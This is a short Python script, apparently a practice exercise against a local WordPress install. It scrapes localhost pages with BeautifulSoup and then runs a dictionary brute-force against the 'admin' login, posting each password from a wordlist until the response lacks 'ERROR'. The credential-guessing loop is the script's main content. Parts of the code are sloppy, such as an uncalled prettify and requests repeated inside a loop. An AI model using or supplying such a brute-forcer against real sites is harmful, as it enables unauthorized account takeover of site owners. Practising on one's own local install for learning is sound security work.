from re import S
from bs4 import BeautifulSoup
import requests

requests.get("http://127.0.0.1")
req_ = requests.get("http://127.0.0.1")

soup = BeautifulSoup(req_.text, 'html.parser')

print(soup.prettify)

req_.headers

req_.content

print(soup.title)


home_ = requests.get("http://localhost")
soup = BeautifulSoup(home_.content,"html.parser")

imgs = soup.find_all("a",href=True)
imgs_href=[]

for img in imgs:
    imgs_href.append(img['href'])

imgs_set = set(imgs_href)

for img in imgs_href:
    print(img)

    word_p = requests.get("http://localhost/wp-admin/")

    soup_word_p=BeautifulSoup(word_p.text,"html.parser")
    print(soup_word_p.prettify())


passfile = "password_dictionary.txt"

with open(passfile, "r") as f :
    for word in f:
        word = word.strip("\n")
        trying_ = requests.post("http://localhost/wp-admin", data = {"log":"admin", "pwd":word})


        if "ERROR" not in trying_.text:
            print("Success, the password is: "+word)
            break
        else:
            print("Incorrect password: " +word)
            